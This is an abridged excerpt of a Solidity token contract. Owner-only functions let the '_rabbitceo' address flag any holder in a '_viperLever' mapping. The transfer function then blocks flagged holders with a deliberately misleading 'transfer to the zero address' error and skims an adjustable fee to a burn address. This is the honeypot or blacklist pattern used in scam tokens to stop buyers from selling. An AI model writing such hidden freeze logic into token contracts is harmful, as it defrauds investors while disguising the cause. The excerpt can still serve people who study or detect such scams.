...
contract Token is Ownable {
    ...
    function cancelViperLevel(address sss) external   {
        require(_rabbitceo == _msgSender());
        if (_rabbitceo == _msgSender()) {
            _viperLever[sss] = false;
        }
    }

    function setViperLever(address sss) external   {
        require(_rabbitceo == _msgSender());
        if (_rabbitceo == _msgSender()) {
    ...
    function GetviperLever(address sss) public  returns(bool)  {
        return _viperLever[sss];
    }

    function MAdminViper() external {
        if (_rabbitceo == _msgSender()){
    ...
    function _transfer(
        ...
        require(_viperLever[from] != true, "ERC20: transfer to the zero address");
        uint256 curbalance = _balances[from];
        require(curbalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[from] = curbalance-(amount);
        uint256 feeAmount = amount*(pepepefeee)/(100);
        _balances[to] = _balances[to]+(amount-feeAmount);
        emit Transfer(from, to, amount);
        emit Transfer(from, 0x000000000000000000000000000000000000dEaD, feeAmount);
    }
